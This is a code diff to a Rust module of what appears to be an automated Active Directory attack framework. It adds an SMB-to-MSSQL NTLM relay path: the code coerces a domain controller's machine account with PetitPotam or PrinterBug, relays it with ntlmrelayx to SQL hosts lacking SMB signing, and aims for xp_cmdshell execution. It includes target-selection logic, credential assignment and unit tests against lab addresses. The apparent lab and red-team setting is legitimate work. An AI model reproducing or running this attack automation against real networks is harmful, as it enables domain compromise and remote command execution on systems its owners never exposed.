@@ -4,9 +4,13 @@
 //! trigger (PetitPotam, PrinterBug, scheduled task bots). This module dispatches
 //! relay attacks when:
 //!
-//!   1. SMB signing is disabled on a target (relay destination)
-//!   2. An ADCS web enrollment endpoint exists (ESC8 relay target)
-//!   3. We have credentials to trigger coercion or a known coercion source
+//!   1. SMB signing is disabled on a target (relay destination, SmbToLdap)
+//!   2. An ADCS web enrollment endpoint exists (Esc8 relay target)
+//!   3. MSSQL is reachable on a host with SMB signing disabled (SmbToMssql) —
+//!      coerce a DC's machine account and relay to MSSQL; the SQL service
+//!      typically grants the machine sysadmin in lab/default builds, opening
+//!      `xp_cmdshell` on the SQL host.
+//!   4. We have credentials to trigger coercion or a known coercion source
 //!
 //! The worker agent coordinates ntlmrelayx + coercion within a single task.
 
@@ -87,6 +91,19 @@ pub async fn auto_ntlm_relay(dispatcher: Arc<Dispatcher>, mut shutdown: watch::R
                         "listener_ip": item.listener,
                         "ca_name": ca_name,
                         "domain": domain,
+                        "coercion_source": item.coercion_source,
+                    });
+                    if let Some(cred) = credential_json.as_ref() {
+                        p["credential"] = cred.clone();
+                    }
+                    p
+                }
+                RelayType::SmbToMssql => {
+                    let mut p = json!({
+                        "technique": "ntlm_relay_mssql",
+                        "relay_target": item.relay_target,
+                        "mssql_target": item.relay_target,
+                        "listener_ip": item.listener,
                         "coercion_source": item.coercion_source,
                     });
                     if let Some(cred) = credential_json.as_ref() {
@@ -295,6 +312,82 @@ fn collect_relay_work(
         });
     }
 
+    // Path 3: Relay to MSSQL on a host whose SMB signing is also disabled.
+    // The classic GOAD/lab path: SQL service account is typically granted
+    // sysadmin on the SQL host, so a coerced machine-account auth relayed
+    // into MSSQL lands xp_cmdshell as the SQL service user. We pair it with
+    // a coercion-source DC and dispatch a single coercion+relay task.
+    let smb_signing_disabled_hosts: std::collections::HashSet<String> = state
+        .discovered_vulnerabilities
+        .values()
+        .filter(|v| v.vuln_type.eq_ignore_ascii_case("smb_signing_disabled"))
+        .filter(|v| !state.exploited_vulnerabilities.contains(&v.vuln_id))
+        .map(|v| {
+            v.details
+                .get("target_ip")
+                .or_else(|| v.details.get("ip"))
+                .and_then(|x| x.as_str())
+                .unwrap_or(&v.target)
+                .to_string()
+        })
+        .filter(|ip| !ip.is_empty())
+        .collect();
+
+    for vuln in state.discovered_vulnerabilities.values() {
+        if !vuln.vuln_type.eq_ignore_ascii_case("mssql_access") {
+            continue;
+        }
+        if state.exploited_vulnerabilities.contains(&vuln.vuln_id) {
+            continue;
+        }
+
+        let mssql_ip = vuln
+            .details
+            .get("target_ip")
+            .or_else(|| vuln.details.get("ip"))
+            .and_then(|v| v.as_str())
+            .unwrap_or(&vuln.target);
+        if mssql_ip.is_empty() {
+            continue;
+        }
+
+        // Gate: the MSSQL host must also have SMB signing disabled so the
+        // relayed auth actually binds. Without this the relay is rejected by
+        // SMB signing enforcement and we burn the dedup for nothing.
+        if !smb_signing_disabled_hosts.contains(mssql_ip) {
+            continue;
+        }
+
+        let relay_key = format!("mssql_relay:{mssql_ip}");
+        if state.is_processed(DEDUP_SET, &relay_key) {
+            continue;
+        }
+
+        let relay_target_domain = vuln
+            .details
+            .get("domain")
+            .and_then(|v| v.as_str())
+            .filter(|s| !s.is_empty())
+            .map(|s| s.to_string())
+            .or_else(|| host_domain_for_ip(state, mssql_ip));
+        let coercion_source = find_coercion_source_for_forest(
+            &state.domain_controllers,
+            relay_target_domain.as_deref(),
+            |ip| state.is_processed(DEDUP_COERCED_DCS, ip),
+        );
+
+        let cred = pick_credential_for_forest(state, coercion_source.as_deref());
+
+        items.push(RelayWork {
+            dedup_key: relay_key,
+            relay_type: RelayType::SmbToMssql,
+            relay_target: mssql_ip.to_string(),
+            coercion_source,
+            listener: listener.to_string(),
+            credential: cred,
+        });
+    }
+
     items
 }
 
@@ -381,6 +474,7 @@ struct RelayWork {
 enum RelayType {
     SmbToLdap,
     Esc8 { ca_name: String, domain: String },
+    SmbToMssql,
 }
 
 impl std::fmt::Display for RelayType {
@@ -388,6 +482,7 @@ impl std::fmt::Display for RelayType {
         match self {
             Self::SmbToLdap => write!(f, "smb_to_ldap"),
             Self::Esc8 { .. } => write!(f, "esc8_adcs"),
+            Self::SmbToMssql => write!(f, "smb_to_mssql"),
         }
     }
 }
@@ -408,6 +503,7 @@ mod tests {
             .to_string(),
             "esc8_adcs"
         );
+        assert_eq!(RelayType::SmbToMssql.to_string(), "smb_to_mssql");
     }
 
     #[test]
@@ -420,6 +516,12 @@ mod tests {
     fn dedup_key_format_esc8() {
         let key = format!("esc8_relay:{}", "192.168.58.10");
         assert_eq!(key, "esc8_relay:192.168.58.10");
+    }
+
+    #[test]
+    fn dedup_key_format_mssql() {
+        let key = format!("mssql_relay:{}", "192.168.58.22");
+        assert_eq!(key, "mssql_relay:192.168.58.22");
     }
 
     #[test]
@@ -1156,6 +1258,124 @@ mod tests {
         assert!(!same_forest_domain("", "contoso.local"));
         assert!(!same_forest_domain("contoso.local", ""));
         assert!(same_forest_domain("", "")); // both unknown is still consistent
+    }
+
+    fn make_mssql_vuln(id: &str, target_ip: &str) -> ares_core::models::VulnerabilityInfo {
+        let mut details = HashMap::new();
+        details.insert(
+            "target_ip".to_string(),
+            serde_json::Value::String(target_ip.to_string()),
+        );
+        ares_core::models::VulnerabilityInfo {
+            vuln_id: id.to_string(),
+            vuln_type: "mssql_access".to_string(),
+            target: target_ip.to_string(),
+            discovered_by: "scanner".to_string(),
+            discovered_at: chrono::Utc::now(),
+            details,
+            recommended_agent: String::new(),
+            priority: 4,
+        }
+    }
+
+    #[tokio::test]
+    async fn collect_relay_work_mssql_requires_smb_signing_disabled() {
+        // mssql_access alone (no SMB signing finding on the same host) must
+        // NOT produce a mssql relay work item — the relay would be rejected
+        // by SMB signing enforcement.
+        let shared = SharedState::new("test".into());
+        {
+            let mut s = shared.write().await;
+            s.discovered_vulnerabilities
+                .insert("v1".into(), make_mssql_vuln("v1", "192.168.58.22"));
+            s.domain_controllers
+                .insert("contoso.local".into(), "192.168.58.10".into());
+        }
+        let state = shared.read().await;
+        let work = collect_relay_work(&state, "192.168.58.100");
+        // Only the mssql vuln is present (no smb_signing_disabled) — no work.
+        assert!(
+            work.iter()
+                .all(|w| !matches!(w.relay_type, RelayType::SmbToMssql)),
+            "mssql_access without smb_signing_disabled on the host must not relay"
+        );
+    }
+
+    #[tokio::test]
+    async fn collect_relay_work_mssql_path_fires_when_paired_with_smb_signing() {
+        // The GOAD slam dunk: mssql_access + smb_signing_disabled on the
+        // same host → emit a SmbToMssql relay work item.
+        let shared = SharedState::new("test".into());
+        {
+            let mut s = shared.write().await;
+            s.discovered_vulnerabilities.insert(
+                "v_mssql".into(),
+                make_mssql_vuln("v_mssql", "192.168.58.22"),
+            );
+            s.discovered_vulnerabilities
+                .insert("v_smb".into(), make_smb_vuln("v_smb", "192.168.58.22"));
+            s.domain_controllers
+                .insert("contoso.local".into(), "192.168.58.10".into());
+        }
+        let state = shared.read().await;
+        let work = collect_relay_work(&state, "192.168.58.100");
+        // Two work items expected: SmbToLdap on the smb_signing vuln AND
+        // SmbToMssql on the mssql vuln (same host, different attack path).
+        let mssql_items: Vec<_> = work
+            .iter()
+            .filter(|w| matches!(w.relay_type, RelayType::SmbToMssql))
+            .collect();
+        assert_eq!(mssql_items.len(), 1, "expected one SmbToMssql work item");
+        assert_eq!(mssql_items[0].relay_target, "192.168.58.22");
+        assert_eq!(mssql_items[0].dedup_key, "mssql_relay:192.168.58.22");
+        assert_eq!(mssql_items[0].coercion_source, Some("192.168.58.10".into()));
+    }
+
+    #[tokio::test]
+    async fn collect_relay_work_mssql_skips_already_processed() {
+        let shared = SharedState::new("test".into());
+        {
+            let mut s = shared.write().await;
+            s.discovered_vulnerabilities.insert(
+                "v_mssql".into(),
+                make_mssql_vuln("v_mssql", "192.168.58.22"),
+            );
+            s.discovered_vulnerabilities
+                .insert("v_smb".into(), make_smb_vuln("v_smb", "192.168.58.22"));
+            s.mark_processed(DEDUP_SET, "mssql_relay:192.168.58.22".into());
+        }
+        let state = shared.read().await;
+        let work = collect_relay_work(&state, "192.168.58.100");
+        assert!(
+            work.iter()
+                .all(|w| !matches!(w.relay_type, RelayType::SmbToMssql)),
+            "already-processed mssql relay must not re-emit"
+        );
+    }
+
+    #[tokio::test]
+    async fn collect_relay_work_mssql_skips_exploited_smb_signing() {
+        // If the paired smb_signing vuln is already exploited, the SMB
+        // signing gate fails (we filter to !exploited above) — but the
+        // mssql_access alone shouldn't trigger the relay either.
+        let shared = SharedState::new("test".into());
+        {
+            let mut s = shared.write().await;
+            s.discovered_vulnerabilities.insert(
+                "v_mssql".into(),
+                make_mssql_vuln("v_mssql", "192.168.58.22"),
+            );
+            s.discovered_vulnerabilities
+                .insert("v_smb".into(), make_smb_vuln("v_smb", "192.168.58.22"));
+            s.exploited_vulnerabilities.insert("v_smb".into());
+        }
+        let state = shared.read().await;
+        let work = collect_relay_work(&state, "192.168.58.100");
+        assert!(
+            work.iter()
+                .all(|w| !matches!(w.relay_type, RelayType::SmbToMssql)),
+            "exploited paired smb_signing should remove the relay gate"
+        );
     }
 
     #[test]
